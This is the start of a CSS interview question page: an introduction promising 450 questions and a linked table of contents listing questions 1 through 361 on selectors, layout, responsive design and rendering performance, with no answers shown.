# CSS Interview Questions and Answers

_Last updated: October 28, 2026_

There are 450 questions here: 150 easy, 150 moderate and 150 advanced. They cover modern CSS as it works in current browsers (late 2026). This includes newer features like nesting, cascade layers, container queries, `:has()`, anchor positioning and view transitions. If a feature only works in some browsers, the answer says so. Check MDN or caniuse before you use it in production.

## Table of Contents

- [Easy Questions (1-150)](#easy-questions-1-150)
- [Moderate Questions (151-300)](#moderate-questions-151-300)
- [Advanced Questions (301-450)](#advanced-questions-301-450)

### Easy Questions (1-150)

- [1: What is CSS?](#1-what-is-css)
- [2: What are the ways to add CSS to a page?](#2-what-are-the-ways-to-add-css-to-a-page)
- [3: What does a CSS rule look like?](#3-what-does-a-css-rule-look-like)
- [4: What is a selector?](#4-what-is-a-selector)
- [5: What is the difference between type, class and id selectors?](#5-what-is-the-difference-between-type-class-and-id-selectors)
- [6: What does the universal selector `*` do?](#6-what-does-the-universal-selector--do)
- [7: How do you apply the same styles to several selectors?](#7-how-do-you-apply-the-same-styles-to-several-selectors)
- [8: What is the difference between the descendant and child combinators?](#8-what-is-the-difference-between-the-descendant-and-child-combinators)
- [9: What is the difference between `+` and `~` combinators?](#9-what-is-the-difference-between--and--combinators)
- [10: What are attribute selectors?](#10-what-are-attribute-selectors)
- [11: What is a pseudo-class?](#11-what-is-a-pseudo-class)
- [12: What is a pseudo-element?](#12-what-is-a-pseudo-element)
- [13: What is the difference between `:` and `::`?](#13-what-is-the-difference-between--and-)
- [14: What does "cascading" mean in CSS?](#14-what-does-cascading-mean-in-css)
- [15: What is specificity?](#15-what-is-specificity)
- [16: How do you calculate specificity?](#16-how-do-you-calculate-specificity)
- [17: What does `!important` do and when should you use it?](#17-what-does-important-do-and-when-should-you-use-it)
- [18: What is inheritance in CSS?](#18-what-is-inheritance-in-css)
- [19: What do `inherit`, `initial`, `unset` and `revert` do?](#19-what-do-inherit-initial-unset-and-revert-do)
- [20: What is the CSS box model?](#20-what-is-the-css-box-model)
- [21: What is the difference between `content-box` and `border-box`?](#21-what-is-the-difference-between-content-box-and-border-box)
- [22: How do you make every element use `border-box`?](#22-how-do-you-make-every-element-use-border-box)
- [23: What is the difference between margin and padding?](#23-what-is-the-difference-between-margin-and-padding)
- [24: What is margin collapsing?](#24-what-is-margin-collapsing)
- [25: How do the margin and padding shorthands work with 1, 2, 3 or 4 values?](#25-how-do-the-margin-and-padding-shorthands-work-with-1-2-3-or-4-values)
- [26: What is the difference between `block`, `inline` and `inline-block`?](#26-what-is-the-difference-between-block-inline-and-inline-block)
- [27: What is the difference between `display: none`, `visibility: hidden` and `opacity: 0`?](#27-what-is-the-difference-between-display-none-visibility-hidden-and-opacity-0)
- [28: What is `position: static`?](#28-what-is-position-static)
- [29: What does `position: relative` do?](#29-what-does-position-relative-do)
- [30: What does `position: absolute` do?](#30-what-does-position-absolute-do)
- [31: What does `position: fixed` do?](#31-what-does-position-fixed-do)
- [32: What does `position: sticky` do?](#32-what-does-position-sticky-do)
- [33: What is `z-index`?](#33-what-is-z-index)
- [34: Why does `z-index` sometimes have no effect?](#34-why-does-z-index-sometimes-have-no-effect)
- [35: What do `float` and `clear` do?](#35-what-do-float-and-clear-do)
- [36: What is a clearfix?](#36-what-is-a-clearfix)
- [37: What are the values of `overflow`?](#37-what-are-the-values-of-overflow)
- [38: What is the difference between `px`, `em` and `rem`?](#38-what-is-the-difference-between-px-em-and-rem)
- [39: What is the `%` unit relative to?](#39-what-is-the--unit-relative-to)
- [40: What are `vw` and `vh`?](#40-what-are-vw-and-vh)
- [41: What are `svh`, `lvh` and `dvh`?](#41-what-are-svh-lvh-and-dvh)
- [42: What are the `ch` and `ex` units?](#42-what-are-the-ch-and-ex-units)
- [43: What color formats does CSS support?](#43-what-color-formats-does-css-support)
- [44: How do you add transparency to a color?](#44-how-do-you-add-transparency-to-a-color)
- [45: What is `currentColor`?](#45-what-is-currentcolor)
- [46: What is the difference between `opacity` and an alpha color?](#46-what-is-the-difference-between-opacity-and-an-alpha-color)
- [47: How does `font-family` work?](#47-how-does-font-family-work)
- [48: Which properties control font size, weight and style?](#48-which-properties-control-font-size-weight-and-style)
- [49: Why should `line-height` usually have no unit?](#49-why-should-line-height-usually-have-no-unit)
- [50: Which properties are used to style text?](#50-which-properties-are-used-to-style-text)
- [51: What do `letter-spacing` and `word-spacing` do?](#51-what-do-letter-spacing-and-word-spacing-do)
- [52: What does the `white-space` property do?](#52-what-does-the-white-space-property-do)
- [53: How do you cut off long text with "..."?](#53-how-do-you-cut-off-long-text-with-)
- [54: What is `@font-face`?](#54-what-is-font-face)
- [55: What is a system font stack?](#55-what-is-a-system-font-stack)
- [56: What are the main background properties?](#56-what-are-the-main-background-properties)
- [57: Can an element have more than one background?](#57-can-an-element-have-more-than-one-background)
- [58: What is the difference between `background-size: cover` and `contain`?](#58-what-is-the-difference-between-background-size-cover-and-contain)
- [59: How do you create a gradient?](#59-how-do-you-create-a-gradient)
- [60: How do `border` and `border-radius` work?](#60-how-do-border-and-border-radius-work)
- [61: How do you make a circle?](#61-how-do-you-make-a-circle)
- [62: What is the difference between `outline` and `border`?](#62-what-is-the-difference-between-outline-and-border)
- [63: How does `box-shadow` work?](#63-how-does-box-shadow-work)
- [64: How do you add a shadow to text?](#64-how-do-you-add-a-shadow-to-text)
- [65: What do `min-width`, `max-width`, `min-height` and `max-height` do?](#65-what-do-min-width-max-width-min-height-and-max-height-do)
- [66: What does `auto` mean for `width` and `margin`?](#66-what-does-auto-mean-for-width-and-margin)
- [67: How do you center a block element horizontally?](#67-how-do-you-center-a-block-element-horizontally)
- [68: How do you center text?](#68-how-do-you-center-text)
- [69: What is Flexbox?](#69-what-is-flexbox)
- [70: What are the main axis and the cross axis in Flexbox?](#70-what-are-the-main-axis-and-the-cross-axis-in-flexbox)
- [71: What does `flex-direction` do?](#71-what-does-flex-direction-do)
- [72: What does `justify-content` do?](#72-what-does-justify-content-do)
- [73: What does `align-items` do?](#73-what-does-align-items-do)
- [74: What does `flex-wrap` do?](#74-what-does-flex-wrap-do)
- [75: What does the `gap` property do?](#75-what-does-the-gap-property-do)
- [76: What does `flex: 1` mean?](#76-what-does-flex-1-mean)
- [77: What does the `order` property do?](#77-what-does-the-order-property-do)
- [78: What does `align-self` do?](#78-what-does-align-self-do)
- [79: How do you center an element both ways with Flexbox?](#79-how-do-you-center-an-element-both-ways-with-flexbox)
- [80: What is CSS Grid?](#80-what-is-css-grid)
- [81: What is the `fr` unit?](#81-what-is-the-fr-unit)
- [82: What does `repeat()` do in grid?](#82-what-does-repeat-do-in-grid)
- [83: How do you make a grid item span several columns or rows?](#83-how-do-you-make-a-grid-item-span-several-columns-or-rows)
- [84: What is `grid-template-areas`?](#84-what-is-grid-template-areas)
- [85: When should you use Flexbox and when should you use Grid?](#85-when-should-you-use-flexbox-and-when-should-you-use-grid)
- [86: What is the shortest way to center something with Grid?](#86-what-is-the-shortest-way-to-center-something-with-grid)
- [87: What are media queries?](#87-what-are-media-queries)
- [88: What is mobile-first CSS?](#88-what-is-mobile-first-css)
- [89: Why do you need the viewport meta tag?](#89-why-do-you-need-the-viewport-meta-tag)
- [90: How do you make images responsive with CSS?](#90-how-do-you-make-images-responsive-with-css)
- [91: What is a CSS transition?](#91-what-is-a-css-transition)
- [92: What are the parts of the `transition` shorthand?](#92-what-are-the-parts-of-the-transition-shorthand)
- [93: What does `transform` do?](#93-what-does-transform-do)
- [94: How do you create a CSS animation?](#94-how-do-you-create-a-css-animation)
- [95: What are the animation properties?](#95-what-are-the-animation-properties)
- [96: What is the difference between `:hover`, `:focus` and `:active`?](#96-what-is-the-difference-between-hover-focus-and-active)
- [97: What is `:focus-visible`?](#97-what-is-focus-visible)
- [98: How do `:first-child`, `:last-child` and `:nth-child()` work?](#98-how-do-first-child-last-child-and-nth-child-work)
- [99: What is the difference between `:nth-child()` and `:nth-of-type()`?](#99-what-is-the-difference-between-nth-child-and-nth-of-type)
- [100: What does `:not()` do?](#100-what-does-not-do)
- [101: How do `::before` and `::after` work?](#101-how-do-before-and-after-work)
- [102: What do `::placeholder` and `::selection` do?](#102-what-do-placeholder-and-selection-do)
- [103: What are `::first-letter` and `::first-line`?](#103-what-are-first-letter-and-first-line)
- [104: What are CSS custom properties?](#104-what-are-css-custom-properties)
- [105: How do you give `var()` a fallback value?](#105-how-do-you-give-var-a-fallback-value)
- [106: What does `calc()` do?](#106-what-does-calc-do)
- [107: What are `min()`, `max()` and `clamp()`?](#107-what-are-min-max-and-clamp)
- [108: How do you write comments in CSS?](#108-how-do-you-write-comments-in-css)
- [109: What is the difference between a CSS reset and Normalize.css?](#109-what-is-the-difference-between-a-css-reset-and-normalizecss)
- [110: What is the user agent stylesheet?](#110-what-is-the-user-agent-stylesheet)
- [111: How do you style lists?](#111-how-do-you-style-lists)
- [112: In what order should you write link states?](#112-in-what-order-should-you-write-link-states)
- [113: What does the `cursor` property do?](#113-what-does-the-cursor-property-do)
- [114: What does `object-fit` do?](#114-what-does-object-fit-do)
- [115: What does `aspect-ratio` do?](#115-what-does-aspect-ratio-do)
- [116: What does `vertical-align` do?](#116-what-does-vertical-align-do)
- [117: What does `pointer-events: none` do?](#117-what-does-pointer-events-none-do)
- [118: What does `display: inline-flex` do?](#118-what-does-display-inline-flex-do)
- [119: How do you style tables?](#119-how-do-you-style-tables)
- [120: Why does `opacity` on a parent affect its children?](#120-why-does-opacity-on-a-parent-affect-its-children)
- [121: What is a CSS preprocessor?](#121-what-is-a-css-preprocessor)
- [122: What are vendor prefixes?](#122-what-are-vendor-prefixes)
- [123: What is PostCSS?](#123-what-is-postcss)
- [124: What is a CSS framework?](#124-what-is-a-css-framework)
- [125: Why should you avoid `@import` in plain CSS?](#125-why-should-you-avoid-import-in-plain-css)
- [126: What is the difference between `<link>` and `@import`?](#126-what-is-the-difference-between-link-and-import)
- [127: What is a common mistake with shorthand properties?](#127-what-is-a-common-mistake-with-shorthand-properties)
- [128: What is the "62.5%" trick, and should you use it?](#128-what-is-the-625-trick-and-should-you-use-it)
- [129: What does the `inset` property do?](#129-what-does-the-inset-property-do)
- [130: What are logical properties?](#130-what-are-logical-properties)
- [131: How do you detect dark mode in CSS?](#131-how-do-you-detect-dark-mode-in-css)
- [132: What is `prefers-reduced-motion`?](#132-what-is-prefers-reduced-motion)
- [133: How do you write print styles?](#133-how-do-you-write-print-styles)
- [134: What is a CSS sprite?](#134-what-is-a-css-sprite)
- [135: What does the `resize` property do?](#135-what-does-the-resize-property-do)
- [136: What does `scroll-behavior: smooth` do?](#136-what-does-scroll-behavior-smooth-do)
- [137: What does `accent-color` do?](#137-what-does-accent-color-do)
- [138: Which pseudo-classes help style form states?](#138-which-pseudo-classes-help-style-form-states)
- [139: What is the difference between `:invalid` and `:user-invalid`?](#139-what-is-the-difference-between-invalid-and-user-invalid)
- [140: What is `::marker`?](#140-what-is-marker)
- [141: What does the `filter` property do?](#141-what-does-the-filter-property-do)
- [142: What does `backdrop-filter` do?](#142-what-does-backdrop-filter-do)
- [143: What is the difference between `overflow-wrap` and `word-break`?](#143-what-is-the-difference-between-overflow-wrap-and-word-break)
- [144: What does `text-wrap: balance` do?](#144-what-does-text-wrap-balance-do)
- [145: How do you limit text to a set number of lines?](#145-how-do-you-limit-text-to-a-set-number-of-lines)
- [146: Why doesn't `height: 100%` work?](#146-why-doesnt-height-100-work)
- [147: What does `display: contents` do?](#147-what-does-display-contents-do)
- [148: How do you debug CSS in the browser?](#148-how-do-you-debug-css-in-the-browser)
- [149: What happens when a browser sees CSS it doesn't understand?](#149-what-happens-when-a-browser-sees-css-it-doesnt-understand)
- [150: How do you check if a CSS feature is safe to use?](#150-how-do-you-check-if-a-css-feature-is-safe-to-use)

### Moderate Questions (151-300)

- [151: How does specificity work for `:is()`, `:where()`, `:not()` and `:has()`?](#151-how-does-specificity-work-for-is-where-not-and-has)
- [152: When would you use `:where()` instead of `:is()`?](#152-when-would-you-use-where-instead-of-is)
- [153: What is `:has()` and what can you do with it?](#153-what-is-has-and-what-can-you-do-with-it)
- [154: How does native CSS nesting work?](#154-how-does-native-css-nesting-work)
- [155: How is native nesting different from Sass nesting?](#155-how-is-native-nesting-different-from-sass-nesting)
- [156: What are cascade layers (`@layer`)?](#156-what-are-cascade-layers-layer)
- [157: How do layer order and unlayered styles work?](#157-how-do-layer-order-and-unlayered-styles-work)
- [158: How does `!important` behave inside cascade layers?](#158-how-does-important-behave-inside-cascade-layers)
- [159: How do you put third-party CSS into a cascade layer?](#159-how-do-you-put-third-party-css-into-a-cascade-layer)
- [160: What is the full order of the cascade?](#160-what-is-the-full-order-of-the-cascade)
- [161: What is a stacking context, and what creates one?](#161-what-is-a-stacking-context-and-what-creates-one)
- [162: A dropdown shows up behind another section even with `z-index: 9999`. How do you fix it?](#162-a-dropdown-shows-up-behind-another-section-even-with-z-index-9999-how-do-you-fix-it)
- [163: What is a block formatting context (BFC)?](#163-what-is-a-block-formatting-context-bfc)
- [164: How do you create a block formatting context?](#164-how-do-you-create-a-block-formatting-context)
- [165: What is the containing block of an absolutely positioned element?](#165-what-is-the-containing-block-of-an-absolutely-positioned-element)
- [166: Why might `position: sticky` not work?](#166-why-might-position-sticky-not-work)
- [167: Why does a `position: fixed` modal scroll with the page?](#167-why-does-a-position-fixed-modal-scroll-with-the-page)
- [168: What is the difference between `flex-basis` and `width`?](#168-what-is-the-difference-between-flex-basis-and-width)
- [169: How do `flex-grow` and `flex-shrink` split the space?](#169-how-do-flex-grow-and-flex-shrink-split-the-space)
- [170: Why does a flex item overflow instead of shrinking?](#170-why-does-a-flex-item-overflow-instead-of-shrinking)
- [171: What is the difference between `align-items` and `align-content`?](#171-what-is-the-difference-between-align-items-and-align-content)
- [172: How does `margin: auto` work in a flex container?](#172-how-does-margin-auto-work-in-a-flex-container)
- [173: How do you make a sticky footer layout?](#173-how-do-you-make-a-sticky-footer-layout)
- [174: How do you build the "holy grail" layout?](#174-how-do-you-build-the-holy-grail-layout)
- [175: What is the difference between `auto-fill` and `auto-fit`?](#175-what-is-the-difference-between-auto-fill-and-auto-fit)
- [176: What is the implicit grid?](#176-what-is-the-implicit-grid)
- [177: What does `grid-auto-flow: dense` do?](#177-what-does-grid-auto-flow-dense-do)
- [178: How do named grid lines work?](#178-how-do-named-grid-lines-work)
- [179: What is subgrid?](#179-what-is-subgrid)
- [180: Why use `minmax(0, 1fr)` instead of `1fr`?](#180-why-use-minmax0-1fr-instead-of-1fr)
- [181: What is the difference between `justify-items` and `justify-content` in grid?](#181-what-is-the-difference-between-justify-items-and-justify-content-in-grid)
- [182: How do you stack items on top of each other with grid?](#182-how-do-you-stack-items-on-top-of-each-other-with-grid)
- [183: What are container queries?](#183-what-are-container-queries)
- [184: What do the `container-type` values mean?](#184-what-do-the-container-type-values-mean)
- [185: What are container query units?](#185-what-are-container-query-units)
- [186: How do you name a container and query a specific one?](#186-how-do-you-name-a-container-and-query-a-specific-one)
- [187: What are container style queries?](#187-what-are-container-style-queries)
- [188: What is the media query range syntax?](#188-what-is-the-media-query-range-syntax)
- [189: How do you make font sizes scale with the screen?](#189-how-do-you-make-font-sizes-scale-with-the-screen)
- [190: How do you serve different background images for different screen densities?](#190-how-do-you-serve-different-background-images-for-different-screen-densities)
- [191: How do you choose breakpoints?](#191-how-do-you-choose-breakpoints)
- [192: What are the `hover` and `pointer` media features?](#192-what-are-the-hover-and-pointer-media-features)
- [193: How do logical properties help with right-to-left languages?](#193-how-do-logical-properties-help-with-right-to-left-languages)
- [194: What is the `:dir()` pseudo-class?](#194-what-is-the-dir-pseudo-class)
- [195: What does `writing-mode` do?](#195-what-does-writing-mode-do)
- [196: How do custom properties work with the cascade and inheritance?](#196-how-do-custom-properties-work-with-the-cascade-and-inheritance)
- [197: What is the difference between custom properties and Sass variables?](#197-what-is-the-difference-between-custom-properties-and-sass-variables)
- [198: How do you read and set custom properties from JavaScript?](#198-how-do-you-read-and-set-custom-properties-from-javascript)
- [199: What is `@property`?](#199-what-is-property)
- [200: How do you animate a gradient?](#200-how-do-you-animate-a-gradient)
- [201: What does "invalid at computed-value time" mean?](#201-what-does-invalid-at-computed-value-time-mean)
- [202: How do you build a theme system with custom properties?](#202-how-do-you-build-a-theme-system-with-custom-properties)
- [203: What do `color-scheme` and `light-dark()` do?](#203-what-do-color-scheme-and-light-dark-do)
- [204: What does `color-mix()` do?](#204-what-does-color-mix-do)
- [205: What is relative color syntax?](#205-what-is-relative-color-syntax)
- [206: Why is OKLCH popular for colors?](#206-why-is-oklch-popular-for-colors)
- [207: How do you use wide-gamut colors?](#207-how-do-you-use-wide-gamut-colors)
- [208: How do you animate an element to and from `display: none`?](#208-how-do-you-animate-an-element-to-and-from-display-none)
- [209: How do you animate to `height: auto`?](#209-how-do-you-animate-to-height-auto)
- [210: What does `animation-fill-mode` do?](#210-what-does-animation-fill-mode-do)
- [211: How do you pause or reverse an animation with CSS?](#211-how-do-you-pause-or-reverse-an-animation-with-css)
- [212: What are `cubic-bezier()`, `steps()` and `linear()`?](#212-what-are-cubic-bezier-steps-and-linear)
- [213: Which properties are cheap to animate?](#213-which-properties-are-cheap-to-animate)
- [214: What are the individual transform properties?](#214-what-are-the-individual-transform-properties)
- [215: Why does the order of transform functions matter?](#215-why-does-the-order-of-transform-functions-matter)
- [216: How do 3D transforms work?](#216-how-do-3d-transforms-work)
- [217: What is `will-change` and when should you use it?](#217-what-is-will-change-and-when-should-you-use-it)
- [218: How does scroll snapping work?](#218-how-does-scroll-snapping-work)
- [219: What does `overscroll-behavior` do?](#219-what-does-overscroll-behavior-do)
- [220: How do you stop a fixed header from covering anchor targets?](#220-how-do-you-stop-a-fixed-header-from-covering-anchor-targets)
- [221: How do you style scrollbars?](#221-how-do-you-style-scrollbars)
- [222: How do you make a table header stick when you scroll?](#222-how-do-you-make-a-table-header-stick-when-you-scroll)
- [223: How do you hide something visually but keep it for screen readers?](#223-how-do-you-hide-something-visually-but-keep-it-for-screen-readers)
- [224: How do you write good focus styles?](#224-how-do-you-write-good-focus-styles)
- [225: What is forced colors mode?](#225-what-is-forced-colors-mode)
- [226: How do you handle `prefers-reduced-motion` properly?](#226-how-do-you-handle-prefers-reduced-motion-properly)
- [227: Is content from `::before` and `::after` read by screen readers?](#227-is-content-from-before-and-after-read-by-screen-readers)
- [228: What is BEM?](#228-what-is-bem)
- [229: What are OOCSS, SMACSS and ITCSS?](#229-what-are-oocss-smacss-and-itcss)
- [230: What is utility-first CSS?](#230-what-is-utility-first-css)
- [231: What are CSS Modules?](#231-what-are-css-modules)
- [232: What are the pros and cons of CSS-in-JS?](#232-what-are-the-pros-and-cons-of-css-in-js)
- [233: How does Shadow DOM isolate styles?](#233-how-does-shadow-dom-isolate-styles)
- [234: What do `:host`, `::slotted()` and `::part()` do?](#234-what-do-host-slotted-and-part-do)
- [235: What is `@scope`?](#235-what-is-scope)
- [236: Which Sass features do teams use most?](#236-which-sass-features-do-teams-use-most)
- [237: What is the difference between `@use` and `@import` in Sass?](#237-what-is-the-difference-between-use-and-import-in-sass)
- [238: What do PostCSS and Lightning CSS do in a build?](#238-what-do-postcss-and-lightning-css-do-in-a-build)
- [239: What is `@supports`?](#239-what-is-supports)
- [240: What is progressive enhancement in CSS?](#240-what-is-progressive-enhancement-in-css)
- [241: What does `font-display` do?](#241-what-does-font-display-do)
- [242: What are FOUT and FOIT, and how do you reduce them?](#242-what-are-fout-and-foit-and-how-do-you-reduce-them)
- [243: What are variable fonts?](#243-what-are-variable-fonts)
- [244: How do you stop layout shift when a web font loads?](#244-how-do-you-stop-layout-shift-when-a-web-font-loads)
- [245: How do you crop an image to a shape?](#245-how-do-you-crop-an-image-to-a-shape)
- [246: What does `mask-image` do?](#246-what-does-mask-image-do)
- [247: What does `shape-outside` do?](#247-what-does-shape-outside-do)
- [248: What is the difference between `filter: drop-shadow()` and `box-shadow`?](#248-what-is-the-difference-between-filter-drop-shadow-and-box-shadow)
- [249: What do blend modes do?](#249-what-do-blend-modes-do)
- [250: What does `isolation: isolate` do?](#250-what-does-isolation-isolate-do)
- [251: How do CSS counters work?](#251-how-do-css-counters-work)
- [252: What does `attr()` do in `content`?](#252-what-does-attr-do-in-content)
- [253: How do you style form controls that look different in every browser?](#253-how-do-you-style-form-controls-that-look-different-in-every-browser)
- [254: How do you build a custom checkbox with CSS?](#254-how-do-you-build-a-custom-checkbox-with-css)
- [255: What does `field-sizing: content` do?](#255-what-does-field-sizing-content-do)
- [256: What does `:focus-within` do?](#256-what-does-focus-within-do)
- [257: How do you build a floating label with CSS only?](#257-how-do-you-build-a-floating-label-with-css-only)
- [258: What do `:empty` and `:target` do?](#258-what-do-empty-and-target-do)
- [259: What does `:nth-child(An+B of S)` do?](#259-what-does-nth-childanb-of-s-do)
- [260: What is `::backdrop`?](#260-what-is-backdrop)
- [261: How do you style popovers?](#261-how-do-you-style-popovers)
- [262: How do you style a `<dialog>`?](#262-how-do-you-style-a-dialog)
- [263: How do you style `<details>` and `<summary>`?](#263-how-do-you-style-details-and-summary)
- [264: What does `table-layout: fixed` do?](#264-what-does-table-layout-fixed-do)
- [265: How do you make text truncate inside a flex child?](#265-how-do-you-make-text-truncate-inside-a-flex-child)
- [266: How does multi-column layout work?](#266-how-does-multi-column-layout-work)
- [267: Why is there a gap between `inline-block` elements?](#267-why-is-there-a-gap-between-inline-block-elements)
- [268: Why is there a small gap under an image?](#268-why-is-there-a-small-gap-under-an-image)
- [269: Do margins collapse inside flex and grid containers?](#269-do-margins-collapse-inside-flex-and-grid-containers)
- [270: What can you do with negative margins?](#270-what-can-you-do-with-negative-margins)
- [271: Why is percentage padding based on width?](#271-why-is-percentage-padding-based-on-width)
- [272: What do `min-content`, `max-content` and `fit-content` mean?](#272-what-do-min-content-max-content-and-fit-content-mean)
- [273: What is the difference between `overflow: hidden` and `overflow: clip`?](#273-what-is-the-difference-between-overflow-hidden-and-overflow-clip)
- [274: What is the difference between `overflow-wrap: anywhere` and `break-word`?](#274-what-is-the-difference-between-overflow-wrap-anywhere-and-break-word)
- [275: How do you style SVG icons with CSS?](#275-how-do-you-style-svg-icons-with-css)
- [276: How do you add a dark mode toggle that respects the OS setting?](#276-how-do-you-add-a-dark-mode-toggle-that-respects-the-os-setting)
- [277: What is `prefers-contrast`?](#277-what-is-prefers-contrast)
- [278: How do you control page breaks when printing?](#278-how-do-you-control-page-breaks-when-printing)
- [279: How do you avoid specificity wars?](#279-how-do-you-avoid-specificity-wars)
- [280: What does `all: unset` do, and how is it different from `all: revert`?](#280-what-does-all-unset-do-and-how-is-it-different-from-all-revert)
- [281: What does `revert-layer` do?](#281-what-does-revert-layer-do)
- [282: How do you find out why a style isn't applied?](#282-how-do-you-find-out-why-a-style-isnt-applied)
- [283: How do you debug layout problems?](#283-how-do-you-debug-layout-problems)
- [284: How do you chain fallbacks for custom properties?](#284-how-do-you-chain-fallbacks-for-custom-properties)
- [285: What goes into a modern CSS reset?](#285-what-goes-into-a-modern-css-reset)
- [286: How do you manage `z-index` values in a big project?](#286-how-do-you-manage-z-index-values-in-a-big-project)
- [287: How do you center an absolutely positioned element?](#287-how-do-you-center-an-absolutely-positioned-element)
- [288: How do you make a responsive video embed?](#288-how-do-you-make-a-responsive-video-embed)
- [289: What is `env()` and the safe area?](#289-what-is-env-and-the-safe-area)
- [290: What does `touch-action` do?](#290-what-does-touch-action-do)
- [291: What does `user-select` do?](#291-what-does-user-select-do)
- [292: What is the difference between `:root` and `html`?](#292-what-is-the-difference-between-root-and-html)
- [293: When should you use a container query and when a media query?](#293-when-should-you-use-a-container-query-and-when-a-media-query)
- [294: How do you make a responsive grid of cards without media queries?](#294-how-do-you-make-a-responsive-grid-of-cards-without-media-queries)
- [295: How do you build a full-bleed section inside a centered layout?](#295-how-do-you-build-a-full-bleed-section-inside-a-centered-layout)
- [296: How do you write a "stack" layout that adds space between children?](#296-how-do-you-write-a-stack-layout-that-adds-space-between-children)
- [297: How do you make equal-height columns?](#297-how-do-you-make-equal-height-columns)
- [298: How do you add a skip link?](#298-how-do-you-add-a-skip-link)
- [299: How do you style based on the number of children?](#299-how-do-you-style-based-on-the-number-of-children)
- [300: What do `text-underline-offset` and `text-decoration-thickness` do?](#300-what-do-text-underline-offset-and-text-decoration-thickness-do)

### Advanced Questions (301-450)

- [301: Why is CSS render-blocking?](#301-why-is-css-render-blocking)
- [302: What is the CSSOM?](#302-what-is-the-cssom)
- [303: Why do browsers match selectors from right to left?](#303-why-do-browsers-match-selectors-from-right-to-left)
- [304: Does selector performance matter in practice?](#304-does-selector-performance-matter-in-practice)
- [305: What are the steps of the rendering pipeline?](#305-what-are-the-steps-of-the-rendering-pipeline)
- [306: What is layout thrashing?](#306-what-is-layout-thrashing)
- [307: Which property changes trigger layout, paint or only composite?](#307-which-property-changes-trigger-layout-paint-or-only-composite)
- [308: What are compositor layers and what does promoting an element cost?](#308-what-are-compositor-layers-and-what-does-promoting-an-element-cost)
- [309: What does the `contain` property do?](#309-what-does-the-contain-property-do)
- [310: What does `content-visibility: auto` do?](#310-what-does-content-visibility-auto-do)
- [311: What is critical CSS?](#311-what-is-critical-css)
- [312: How does the `media="print" onload` trick work?](#312-how-does-the-mediaprint-onload-trick-work)
- [313: How do you find and remove unused CSS?](#313-how-do-you-find-and-remove-unused-css)
- [314: How can CSS cause layout shift (CLS)?](#314-how-can-css-cause-layout-shift-cls)
- [315: How can CSS slow down LCP?](#315-how-can-css-slow-down-lcp)
- [316: How do you load fonts as fast as possible?](#316-how-do-you-load-fonts-as-fast-as-possible)
- [317: Can `:has()` hurt performance?](#317-can-has-hurt-performance)
- [318: Why do some CSS animations jank even when they use `transform`?](#318-why-do-some-css-animations-jank-even-when-they-use-transform)
- [319: What are scroll-driven animations?](#319-what-are-scroll-driven-animations)
- [320: How do view timelines and animation ranges work?](#320-how-do-view-timelines-and-animation-ranges-work)
- [321: What is the View Transitions API?](#321-what-is-the-view-transitions-api)
- [322: How does `view-transition-name` work, and what does the pseudo-element tree look like?](#322-how-does-view-transition-name-work-and-what-does-the-pseudo-element-tree-look-like)
- [323: How do cross-document view transitions work?](#323-how-do-cross-document-view-transitions-work)
- [324: What are view transition types?](#324-what-are-view-transition-types)
- [325: What is CSS anchor positioning?](#325-what-is-css-anchor-positioning)
- [326: How do anchor positioning fallbacks work?](#326-how-do-anchor-positioning-fallbacks-work)
- [327: What do `position-area` and `anchor-size()` do?](#327-what-do-position-area-and-anchor-size-do)
- [328: How do you build a tooltip with popover and anchor positioning, without JavaScript?](#328-how-do-you-build-a-tooltip-with-popover-and-anchor-positioning-without-javascript)
- [329: What is the customizable `<select>`?](#329-what-is-the-customizable-select)
- [330: What is the CSS `if()` function?](#330-what-is-the-css-if-function)
- [331: What are `sibling-index()` and `sibling-count()`?](#331-what-are-sibling-index-and-sibling-count)
- [332: What is the typed `attr()` function?](#332-what-is-the-typed-attr-function)
- [333: What are CSS custom functions (`@function`)?](#333-what-are-css-custom-functions-function)
- [334: What do `calc-size()` and `interpolate-size` do?](#334-what-do-calc-size-and-interpolate-size-do)
- [335: What math functions does CSS have besides `calc()`?](#335-what-math-functions-does-css-have-besides-calc)
- [336: When should a registered custom property use `inherits: false`?](#336-when-should-a-registered-custom-property-use-inherits-false)
- [337: What happens with circular custom property references?](#337-what-happens-with-circular-custom-property-references)
- [338: How would you design a cascade layer setup for a large app?](#338-how-would-you-design-a-cascade-layer-setup-for-a-large-app)
- [339: How does scoping proximity work in `@scope`?](#339-how-does-scoping-proximity-work-in-scope)
- [340: What is a "donut scope" and when do you need it?](#340-what-is-a-donut-scope-and-when-do-you-need-it)
- [341: How do styles cross the Shadow DOM boundary?](#341-how-do-styles-cross-the-shadow-dom-boundary)
- [342: What are constructable stylesheets?](#342-what-are-constructable-stylesheets)
- [343: What is CSS Houdini?](#343-what-is-css-houdini)
- [344: Why is `getComputedStyle` sometimes slow?](#344-why-is-getcomputedstyle-sometimes-slow)
- [345: Why do runtime CSS-in-JS libraries hurt performance?](#345-why-do-runtime-css-in-js-libraries-hurt-performance)
- [346: How do zero-runtime CSS-in-JS libraries work?](#346-how-do-zero-runtime-css-in-js-libraries-work)
- [347: What are the trade-offs of atomic CSS?](#347-what-are-the-trade-offs-of-atomic-css)
- [348: How would you structure design tokens in CSS?](#348-how-would-you-structure-design-tokens-in-css)
- [349: How would you support several brands in one codebase?](#349-how-would-you-support-several-brands-in-one-codebase)
- [350: How do you prevent a flash of the wrong theme with server rendering?](#350-how-do-you-prevent-a-flash-of-the-wrong-theme-with-server-rendering)
- [351: What causes a flash of unstyled content (FOUC)?](#351-what-causes-a-flash-of-unstyled-content-fouc)
- [352: How does CSS ordering break when you code-split?](#352-how-does-css-ordering-break-when-you-code-split)
- [353: How do you stop CSS from leaking between micro-frontends?](#353-how-do-you-stop-css-from-leaking-between-micro-frontends)
- [354: A modal opens below the sticky header. Walk through how you'd fix it.](#354-a-modal-opens-below-the-sticky-header-walk-through-how-youd-fix-it)
- [355: What is the top layer and why does it help with `z-index` problems?](#355-what-is-the-top-layer-and-why-does-it-help-with-z-index-problems)
- [356: What makes an element the containing block for `position: fixed` children?](#356-what-makes-an-element-the-containing-block-for-position-fixed-children)
- [357: How are percentage heights worked out?](#357-how-are-percentage-heights-worked-out)
- [358: What is a min-content contribution, and why does it matter?](#358-what-is-a-min-content-contribution-and-why-does-it-matter)
- [359: Can you describe the flexbox sizing algorithm in simple steps?](#359-can-you-describe-the-flexbox-sizing-algorithm-in-simple-steps)
- [360: How does `min-width: auto` work for flex items exactly?](#360-how-does-min-width-auto-work-for-flex-items-exactly)
- [361: Can you describe how grid tracks are sized?](#361-can-you-describe-how-grid-tracks-are-sized)
